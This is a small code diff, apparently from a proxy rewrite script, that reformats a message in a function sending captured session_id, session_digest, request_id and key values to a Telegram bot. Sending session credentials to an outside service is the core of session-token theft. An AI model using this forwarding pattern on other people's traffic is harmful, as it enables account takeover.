@@ -38,7 +38,12 @@ if (reg1.test($request.url)) {
 }
 
 function sendToTelegram(data) {
-  const message = `session_id: ${data.session_id}, session_digest: ${data.session_digest}, request_id: ${data.request_id}, key: ${data.key}`;
+  const message = JSON.stringify({
+    session_id: data.session_id,
+    session_digest: data.session_digest,
+    request_id: data.request_id,
+    key: data.key
+  });
   const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
   const options = {
